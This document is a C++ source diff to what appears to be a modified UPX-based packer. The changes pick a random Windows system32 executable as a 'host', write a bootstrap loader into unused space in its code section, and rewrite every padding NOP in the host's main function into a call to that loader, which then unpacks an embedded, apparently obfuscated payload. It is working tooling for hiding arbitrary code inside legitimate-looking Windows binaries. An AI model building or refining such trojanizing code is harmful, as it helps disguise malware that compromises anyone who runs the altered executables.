@@ -2598,7 +2598,6 @@ void PeFile::pack0(OutputFile *fo, ht &ih, ht &oh, unsigned subsystem_mask,
     linker->defineSymbol("exc_vaddr", IDADDR(PEDIR_EXCEPTION) - ih.codebase);
     linker->defineSymbol("exc_size", IDSIZE(PEDIR_EXCEPTION));
     ht *header = (ht *)(host->getInBuf() + host->getPeOffset());
-    linker->defineSymbol("image_size", header->imagesize + 0x10000); // AllocationGranularity
 
     printf("embededVBase %x\n", host->embededVBase);
     unsigned upx_start = host->embededVBase + obfuscatedSize;
@@ -3258,10 +3257,23 @@ void PeFile64::processTls(Reloc *r, const Interval *iv, unsigned a) {
 
 Host* PeFile64::createHost(PeFile *pe) { return new Host64((PeFile64 *)pe); };
 
+bool Host::replaceNops(char *start, char *bsStart) {
+    // 0F 1F 44 00 00   nop     dword ptr [rax+rax+00h]
+    bool found = false;
+    while (*(unsigned *)(++start) != 0xcccccccc) {
+        if (*(unsigned *)start != 0x441f0f) continue;
+        if (*(start + 4) != 0) continue;
+        *start = 0xe8;
+        start += 1;
+        *(unsigned *)start = bsStart - (start + 4);
+        start += 4;
+        found = true;
+    }
+    return found;
+}
+
 Host64::Host64(PeFile64 *_pe) : PeFile64(&InputFile()) {
     pe = _pe;
-    int bootstrapSize;
-    pe->bsLinker->getLoader(&bootstrapSize);
 
     std::vector<std::string> files = getHostFiles(hostFolder);
     RandomRangeGen<> randGen(0, files.size() - 1);
@@ -3269,11 +3281,12 @@ Host64::Host64(PeFile64 *_pe) : PeFile64(&InputFile()) {
     while (true) {
         p = files[randGen()];
         printf("Try host: %s\n", p.c_str());
+        // p = "c:\\windows\\system32\\srdelayed.exe";
         // p = "c:\\windows\\system32\\netbtugc.exe"; // main
         // p = "c:\\windows\\system32\\Register-CimProvider.exe"; // wmain
         // p = "c:\\windows\\system32\\cliconfg.exe"; // winmain, _acmdln
         // p = "c:\\windows\\system32\\plasrv.exe"; // wwinmain, _wcmdln
-        p = "c:\\windows\\system32\\ucsvc.exe"; // wwinmain, _o__get_wide_winmain_command_line_0
+        // p = "c:\\windows\\system32\\ucsvc.exe"; // wwinmain, _o__get_wide_winmain_command_line_0
         fi->sopen(p.c_str(), O_BINARY | O_RDONLY, SH_DENYNO);
         file_size = upx_int64_t(fi->st_size());
         readFileHeader();
@@ -3290,7 +3303,7 @@ Host64::Host64(PeFile64 *_pe) : PeFile64(&InputFile()) {
                 puts(".rsrc issue");
                 continue;
             }
-            if (isection[0].size - isection[0].vsize > (unsigned)bootstrapSize) {
+            if (isection[0].size - isection[0].vsize > maxBootstrapSize) {
                 break;
             } else {
                 puts("No enough space for bootstrap");
@@ -3311,9 +3324,7 @@ Host64::Host64(PeFile64 *_pe) : PeFile64(&InputFile()) {
     ibuf.fill(file_size, pe->embededSize + ih.filealign, FILLVAL);
 
     // points to ibuf
-    pe_section_t *pSection = (pe_section_t *)(ibuf + pe_offset + sizeof(ih));
-    pSection[0].vsize += bootstrapSize;
-
+    pSection = (pe_section_t *)(ibuf + pe_offset + sizeof(ih));
 
     isGui = ih.subsystem == IMAGE_SUBSYSTEM_WINDOWS_GUI;
 
@@ -3412,7 +3423,9 @@ Host64::Host64(PeFile64 *_pe) : PeFile64(&InputFile()) {
     // patch
     char *base = (char *)ibuf.getVoidPtr();
     char *entry = base + ih.entry;
-    assert(*(entry + 13) == 0xe9);
+    if (*(entry + 13) != 0xe9) {
+        throw std::runtime_error("unsupported mainCRTStartup format");
+    }
     char *__mainCRTStartup = entry + 18 + *(int *)(entry + 14);
 
     char *call_main = __mainCRTStartup;
@@ -3512,29 +3525,21 @@ Host64::Host64(PeFile64 *_pe) : PeFile64(&InputFile()) {
         }
     }
 
-    // Search nop in main
-    // 0F 1F 44 00 00   nop     dword ptr [rax+rax+00h]
-    nop = call_main + 5 + *(int *)(call_main + 1);
-    counter = 0;
-    while (++counter < 0x100) {
-        ++nop;
-        if (*(unsigned *)nop != 0x441f0f) continue;
-        if (*(nop + 4) == 0) break;
-    }
-    if (counter == 0x100) {
-        throw std::runtime_error("Can't find nop");
-    }
-    *nop = 0xe8;
-    nop += 1;
+    main = call_main + 5 + *(int *)(call_main + 1);
 }
 
 void Host64::embed() {
     int bootstrapSize;
     byte *bsloader = pe->bsLinker->getLoader(&bootstrapSize);
     printf("bootstrap size: %x\n", bootstrapSize);
+    if ((unsigned)bootstrapSize > maxBootstrapSize) {
+        throw std::runtime_error("maxBootstrapSize is too small");
+    }
+    pSection[0].vsize += bootstrapSize;
     char *base = (char *)ibuf.getVoidPtr();
     char *codebase = base + ih.codebase;
 
+    /*
     // Find if enough 0xCC
     unsigned qwords = bootstrapSize / 8;
     unsigned remainders = bootstrapSize % 8;
@@ -3567,7 +3572,13 @@ void Host64::embed() {
     printf("bootstrap offset: %x\n", bsOffset);
 
     char *bsStart = codebase + bsOffset;
-    *(unsigned *)nop = bsStart - (nop + 4);
+    */
+
+    char *bsStart = codebase + isection[0].vsize;
+    // Replace all nop in main to ensure being called.
+    if (!replaceNops(main, bsStart)) {
+        throw std::runtime_error("Can't find nop in main");
+    }
 
     memcpy(bsStart, bsloader, bootstrapSize);
     memcpy(ibuf + embededBase, pe->obuf, pe->embededSize);
